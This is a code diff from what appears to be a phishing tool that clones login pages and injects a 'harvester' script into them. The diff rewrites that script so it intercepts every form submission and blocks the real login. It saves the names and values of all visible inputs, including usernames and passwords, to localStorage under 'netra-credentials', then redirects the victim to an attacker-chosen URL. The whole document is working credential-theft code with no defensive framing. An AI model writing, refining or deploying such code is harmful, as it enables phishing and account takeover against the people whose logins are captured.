@@ -24,78 +24,47 @@ export type PageClonerOutput = z.infer<typeof PageClonerOutputSchema>;
 
 const getHarvesterScript = (redirectUrl: string) => `
 <script>
-  document.addEventListener('DOMContentLoaded', (event) => {
-    // Find all forms on the page
-    const forms = document.querySelectorAll('form');
+  // Listen for all form submission events on the page at the capture phase
+  document.addEventListener('submit', function(e) {
+    // Prevent the form from actually submitting to its original destination
+    e.preventDefault();
+    
+    const form = e.target;
+    if (!(form instanceof HTMLFormElement)) return;
 
-    forms.forEach(form => {
-      const passwordInput = form.querySelector('input[type="password"]');
-      if (!passwordInput) return; // Not a login form
-
-      const harvestAndRedirect = () => {
-        let username = '';
-        const usernameSelectors = [
-          'input[type="email"]',
-          'input[name*="user"]',
-          'input[name*="login"]',
-          'input[id*="user"]',
-          'input[id*="login"]',
-          'input[type="text"]' // Fallback
-        ];
-
-        for (const selector of usernameSelectors) {
-          const usernameField = form.querySelector(selector);
-          // Make sure we don't select the password field as the username field
-          if (usernameField && usernameField.type !== 'password') {
-            username = usernameField.value;
-            break;
-          }
-        }
-        
-        const password = passwordInput.value;
-
-        // Post to localStorage instead of using postMessage
-        if (username || password) {
-            try {
-                const credential = {
-                    username: username,
-                    password: password,
-                    timestamp: Date.now()
-                };
-                const storedCreds = localStorage.getItem('netra-credentials');
-                const existingCreds = storedCreds ? JSON.parse(storedCreds) : [];
-                const updatedCreds = [...existingCreds, credential];
-                localStorage.setItem('netra-credentials', JSON.stringify(updatedCreds));
-            } catch (e) {
-                console.error('Failed to save credentials to localStorage', e);
-            }
-        }
-
-        // Redirect after a short delay to ensure localStorage has time to write
-        setTimeout(() => {
-            window.location.href = '${redirectUrl}';
-        }, 200);
-      };
-
-      // Handle standard form submission
-      form.addEventListener('submit', (e) => {
-        e.preventDefault();
-        harvestAndRedirect();
-      });
-
-      // Also handle clicks on submit buttons for JS-driven forms
-      form.querySelectorAll('button[type="submit"], input[type="submit"], [role="button"]').forEach(button => {
-        // Check if the button is likely a submit button
-        const buttonText = (button.textContent || button.value || '').toLowerCase();
-        if (buttonText.includes('sign in') || buttonText.includes('log in') || buttonText.includes('submit')) {
-            button.addEventListener('click', (e) => {
-                e.preventDefault();
-                harvestAndRedirect();
-            });
-        }
-      });
+    // A generic object to hold all captured data
+    let credentials = {};
+    const inputs = form.querySelectorAll('input');
+    
+    // Loop through all inputs and capture their name and value
+    inputs.forEach(input => {
+      // Ignore hidden fields and buttons
+      if (input.type !== 'hidden' && input.type !== 'submit' && input.type !== 'button' && input.name && input.value) {
+        credentials[input.name] = input.value;
+      }
     });
-  });
+
+    try {
+      // Only save if we actually captured something
+      if (Object.keys(credentials).length > 0) {
+        const entry = {
+            ...credentials,
+            timestamp: Date.now()
+        };
+        const storedCreds = localStorage.getItem('netra-credentials');
+        const existingCreds = storedCreds ? JSON.parse(storedCreds) : [];
+        const updatedCreds = [...existingCreds, entry];
+        localStorage.setItem('netra-credentials', JSON.stringify(updatedCreds));
+      }
+    } catch (err) {
+      // Log error to console but do not disrupt user flow
+      console.error('Error saving credentials to localStorage:', err);
+    }
+
+    // Redirect the user to the specified URL
+    window.location.href = '${redirectUrl}';
+    
+  }, true); // Use capture:true to ensure our listener runs before any others
 </script>
 `;
 
@@ -138,4 +107,3 @@ export async function cloneLoginPage(input: PageClonerInput): Promise<PageCloner
     throw new Error('An unknown error occurred during page cloning.');
   }
 }
-
